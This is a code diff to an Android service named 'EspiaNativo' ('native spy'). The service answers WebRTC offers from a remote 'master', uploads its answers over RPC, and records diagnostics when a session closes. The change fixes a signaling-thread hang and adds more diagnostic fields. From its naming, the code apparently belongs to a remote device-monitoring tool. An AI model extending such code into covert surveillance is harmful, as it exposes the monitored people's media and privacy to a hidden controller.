@@ -86,8 +86,11 @@ class EspiaNativo : Service() {
     @Volatile private var remotoListo = false
     // diagnóstico (se reporta al cerrar la sesión → detalle_fin, para ver por qué no junta candidatos)
     @Volatile private var dgCand = 0
+    @Volatile private var dgRemote = "?"
+    @Volatile private var dgAnswer = "?"
     @Volatile private var dgLocal = "?"
     @Volatile private var dgGath = "?"
+    @Volatile private var dgSig = "?"
     @Volatile private var dgMedios = "?"
     private var iceDesde = 0L
     private val colaIceSalida = ConcurrentLinkedQueue<JSONObject>()   // nuestros candidatos hacia el master
@@ -206,25 +209,28 @@ class EspiaNativo : Service() {
                 val offer = SessionDescription(SessionDescription.Type.OFFER, o.optString("sdp"))
                 pc?.setRemoteDescription(object : SdpObs() {
                     override fun onSetSuccess() {
-                        remotoListo = true
-                        flushIceEntrante()
-                        pc?.createAnswer(object : SdpObs() {
-                            override fun onCreateSuccess(desc: SessionDescription) {
-                                // setLocalDescription DEBE tener éxito para que ARRANQUE el ICE gathering
-                                pc?.setLocalDescription(object : SdpObs() {
-                                    override fun onSetSuccess() { dgLocal = "ok" }
-                                    override fun onSetFailure(error: String?) { dgLocal = "fail:" + (error ?: "") }
-                                }, desc)
-                                // la subida es red: fuera del hilo de señalización de WebRTC
-                                thread(isDaemon = true) {
-                                    val ans = JSONObject().put("type", "answer").put("sdp", desc.description)
-                                    rpc("espia_subir_respuesta", JSONObject().put("sesionId", sesion).put("sdp", ans.toString()))
+                        dgRemote = "ok"; remotoListo = true
+                        // [fix] NO crear/fijar el answer DENTRO del callback (hilo de señalización): esa
+                        // re-entrancia colgaba setLocalDescription → nunca arrancaba el ICE. Se hace en un hilo aparte.
+                        thread(isDaemon = true) {
+                            flushIceEntrante()
+                            pc?.createAnswer(object : SdpObs() {
+                                override fun onCreateSuccess(desc: SessionDescription) {
+                                    dgAnswer = "ok"
+                                    thread(isDaemon = true) {
+                                        pc?.setLocalDescription(object : SdpObs() {
+                                            override fun onSetSuccess() { dgLocal = "ok" }
+                                            override fun onSetFailure(error: String?) { dgLocal = "fail:" + (error ?: "") }
+                                        }, desc)
+                                        val ans = JSONObject().put("type", "answer").put("sdp", desc.description)
+                                        rpc("espia_subir_respuesta", JSONObject().put("sesionId", sesion).put("sdp", ans.toString()))
+                                    }
                                 }
-                            }
-                            override fun onCreateFailure(error: String?) { dgLocal = "answerFail:" + (error ?: "") }
-                        }, MediaConstraints())
+                                override fun onCreateFailure(error: String?) { dgAnswer = "fail:" + (error ?: "") }
+                            }, MediaConstraints())
+                        }
                     }
-                    override fun onSetFailure(error: String?) { Log.w(TAG, "setRemote fail: $error"); ofertaAplicada = false }
+                    override fun onSetFailure(error: String?) { dgRemote = "fail:" + (error ?: ""); ofertaAplicada = false }
                 }, offer)
             } catch (e: Throwable) { Log.w(TAG, "oferta: ${e.message}"); ofertaAplicada = false }
         }
@@ -283,7 +289,7 @@ class EspiaNativo : Service() {
             })
         }
         override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
-        override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
+        override fun onSignalingChange(state: PeerConnection.SignalingState?) { dgSig = state?.name ?: "?" }
         override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
         override fun onIceConnectionReceivingChange(receiving: Boolean) {}
         override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) { dgGath = state?.name ?: "?" }
@@ -382,7 +388,7 @@ class EspiaNativo : Service() {
         if (cerrado) return
         cerrado = true
         // diagnóstico embebido en el motivo → queda en detalle_fin de la sesión (para ver por qué no conecta)
-        val diag = "nat[medios=$dgMedios·local=$dgLocal·gath=$dgGath·cand=$dgCand] $motivo"
+        val diag = "nat[medios=$dgMedios·rem=$dgRemote·ans=$dgAnswer·local=$dgLocal·sig=$dgSig·gath=$dgGath·cand=$dgCand] $motivo"
         Log.i(TAG, "cerrar: $diag")
         // canal dedicado que SIEMPRE aterriza (el cierre de sesión lo pisa el master); se lee en yape_dispositivos.espia_diag
         try { rpc("espia_diag", JSONObject().put("device", device).put("diag", diag)) } catch (_: Throwable) {}
